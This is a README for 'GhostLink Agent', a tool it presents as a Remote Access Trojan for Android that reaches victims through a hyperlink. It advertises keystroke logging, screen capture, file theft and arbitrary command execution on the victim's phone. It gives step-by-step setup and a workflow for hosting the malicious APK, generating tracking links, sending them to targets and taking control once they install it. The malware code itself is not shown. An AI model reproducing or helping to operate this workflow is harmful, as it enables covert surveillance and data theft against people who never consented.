# 👻 GhostLink Agent: Link-to-Total-Control Exploit

🔥 Stealth. Remote. Absolute Control.

GhostLink Agent is a comprehensive cybersecurity framework designed to deliver a Remote Access Trojan (RAT) payload via a simple hyperlink. By deploying this tool, you turn a single URL into a gateway to complete, invasive control over the victim's mobile device (primarily Android via Termux integration).

---
## 🚀 Features
- **Hyperlink Delivery:** Distributes malware silently through attractive web links.
- **Full Remote Control:** Gain command-line access (Termux-level control) to the victim's device.
- **Data Exfiltration:** Capture screen data, log keystrokes, access files, and execute arbitrary commands.

## ⚙️ Getting Started (Installation Guide)

This project requires a Python server to host and serve the attack payload (the APK).

### 💻 1. System Requirements
- **Backend:** Python 3.8+
- **Client:** Android OS (Target Device)

### 📦 2. Backend Setup (Your Laptop/Server)
1. **Clone the Repository:** (If using Git)
   `git clone [YourRepoURL]`
   `cd GhostLinkAgent`
2. **Install Dependencies:**
   `pip install -r requirements.txt`
3. **Configuration:**
   Update `config.py` (if present) with your target IP and port settings.
4. **Run the Server:**
   `python main_server.py`

### 📱 3. Client Payload Setup (The Victim)
1. **Payload:** The `ghostlink_agent.apk` file must be placed in the `payload_files/` directory.
2. **Delivery:** The link directs the victim to the server, which automatically pushes the APK for installation.

## 🔗 Workflow
1. **Setup:** Run the server (`main_server.py`).
2. **Generate Link:** Use the API endpoint (e.g., `/api/get_link_details`) to create a unique URL.
3. **Deploy:** Send this URL to your targets.
4. **Control:** Upon click, the user installs the APK, and you connect via your server/Termux shell.

## ⚖️ License
This project is licensed under the MIT License - see the [LICENSE.txt](LICENSE.txt) file for details.